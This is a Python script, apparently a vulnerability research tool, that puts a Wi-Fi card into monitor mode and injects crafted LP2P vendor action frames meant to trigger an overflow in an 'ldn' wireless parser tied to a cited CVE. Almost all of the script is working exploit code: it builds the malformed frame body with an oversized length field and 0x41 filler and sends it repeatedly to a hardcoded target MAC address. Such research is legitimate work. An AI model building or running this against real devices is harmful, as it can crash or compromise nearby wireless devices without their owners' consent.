#!/usr/bin/env -S python3 -u -I
"""Monitor-mode action frame injection for ldn research.

Previous nl80211 CMD_FRAME approach returned -107 (ENOTCONN) because STA-mode
interfaces cannot send action frames to arbitrary destinations.

This script uses monitor-mode raw TX injection via radiotap headers.
Requires: interface supporting monitor mode with TX injection.

Usage:
  sudo python3 -I monitor_inject.py --iface wlp5s0 --channel 1 --test

IMPORTANT: This will disconnect from any associated network while running.
"""

import argparse
import os
import socket
import struct
import subprocess
import sys
import time


def run(cmd, check=True):
    print(f"  $ {cmd}")
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if check and r.returncode != 0:
        print(f"    FAILED: {r.stderr.strip()}")
    return r


def setup_monitor(iface, channel):
    """Put interface into monitor mode on specified channel."""
    mon_iface = f"{iface}mon"

    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type monitor")
    run(f"ip link set {iface} up")
    run(f"iw dev {iface} set channel {channel}")

    return iface


def teardown_monitor(iface):
    """Restore managed mode."""
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type managed")
    run(f"ip link set {iface} up")


RADIOTAP_TX_HDR = bytes([
    0x00, 0x00,  # version, pad
    0x0b, 0x00,  # header length (11 bytes)
    0x04, 0x0c, 0x00, 0x00,  # present flags: TX flags + channel
    0x08, 0x00,  # TX flags: no-ACK
    0x6c, 0x09,  # channel freq 2412 MHz (will be overwritten)
    0xa0,        # channel flags: OFDM, 2GHz (0xa0 = 0x20|0x80)
])


def build_radiotap(channel_freq):
    """Build a minimal radiotap header for TX injection."""
    hdr = bytearray([
        0x00, 0x00,
        0x0d, 0x00,
        0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
    ])
    return bytes(hdr)


def build_action_frame(dst_mac, src_mac, bssid, body):
    """Build an 802.11 Action frame."""
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)  # Frame Control: Action
    frame += b"\x00\x00"               # Duration
    frame += dst_mac                    # Address 1 (destination)
    frame += src_mac                    # Address 2 (source)
    frame += bssid                     # Address 3 (BSSID)
    frame += struct.pack('<H', 0x0000) # Sequence control
    frame += body
    return bytes(frame)


def build_lp2p_body(size_field=0x0100, fill=0x41, body_size=0x800):
    """Build an LP2P action frame body for ldn vulnerability testing.

    For CVE-2026-82079:
    - body[0x21] = 0x03 (type 3 format)
    - body[0x22:0x24] = BE16(body_size - 0x38) (content length)
    - body[0x26] = 0x01, body[0x27] = 0x01 (version/flags)
    - body[0x1DA:0x1DC] = BE16(size_field) — the overflow control field
    - Overflow when size_field > 0x720 (1824 bytes)
    """
    # Category: Vendor Specific Action (0x7f)
    # OUI: 00:22:aa (LP2P)
    body = bytearray(body_size)
    body[0] = 0x7f  # category: vendor-specific
    body[1] = 0x00  # OUI byte 1
    body[2] = 0x22  # OUI byte 2
    body[3] = 0xaa  # OUI byte 3
    body[4] = 0x04  # OUI type
    body[5] = 0x01  # LP2P version
    body[6] = 0x01  # LP2P type
    body[7] = 0x01  # LP2P subtype

    body[0x21] = 0x03  # Type 3 parser
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01

    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, size_field)

    for i in range(0x5C, body_size):
        body[i] = fill

    return bytes(body)


def inject_frame(sock, frame):
    """Send a raw frame via monitor-mode socket."""
    radiotap = build_radiotap(2412)
    pkt = radiotap + frame
    try:
        sent = sock.send(pkt)
        return sent
    except OSError as e:
        return -e.errno


def main():
    parser = argparse.ArgumentParser(description="Monitor-mode action frame injection")
    parser.add_argument("--iface", default="wlp5s0", help="WiFi interface")
    parser.add_argument("--channel", type=int, default=1, help="Channel to inject on")
    parser.add_argument("--dst", default="ec:c4:0d:f3:dc:db", help="Destination MAC")
    parser.add_argument("--src", default="22:7c:ce:e0:bd:56", help="Source MAC")
    parser.add_argument("--test", action="store_true", help="Run injection test")
    parser.add_argument("--size", type=int, default=0x0100, help="Size field value")
    parser.add_argument("--fill", type=int, default=0x41, help="Fill byte")
    parser.add_argument("--count", type=int, default=10, help="Number of frames")
    parser.add_argument("--delay", type=float, default=0.01, help="Inter-frame delay")
    args = parser.parse_args()

    dst_mac = bytes.fromhex(args.dst.replace(":", ""))
    src_mac = bytes.fromhex(args.src.replace(":", ""))
    bssid = dst_mac

    if os.geteuid() != 0:
        print("ERROR: Must run as root (sudo)")
        sys.exit(1)

    print(f"Setting up monitor mode on {args.iface}, channel {args.channel}...")
    mon_iface = setup_monitor(args.iface, args.channel)

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        sock.bind((mon_iface, 0))

        body = build_lp2p_body(size_field=args.size, fill=args.fill)
        frame = build_action_frame(dst_mac, src_mac, bssid, body)

        print(f"\nInjecting {args.count} frames...")
        print(f"  dst={args.dst}, size_field=0x{args.size:04X}, fill=0x{args.fill:02X}")
        print(f"  frame size: {len(frame)} bytes (+radiotap)")

        ok = 0
        err = 0
        for i in range(args.count):
            result = inject_frame(sock, frame)
            if result > 0:
                ok += 1
            else:
                err += 1
                if err == 1:
                    print(f"  First error: {result}")
            if args.delay > 0:
                time.sleep(args.delay)

        print(f"\nResults: {ok} sent, {err} errors")
        sock.close()

    finally:
        print(f"\nRestoring managed mode on {args.iface}...")
        teardown_monitor(args.iface)
        print("Reconnecting (NetworkManager should handle this)...")
        run("nmcli device connect wlp5s0", check=False)

    print("Done.")


if __name__ == "__main__":
    main()
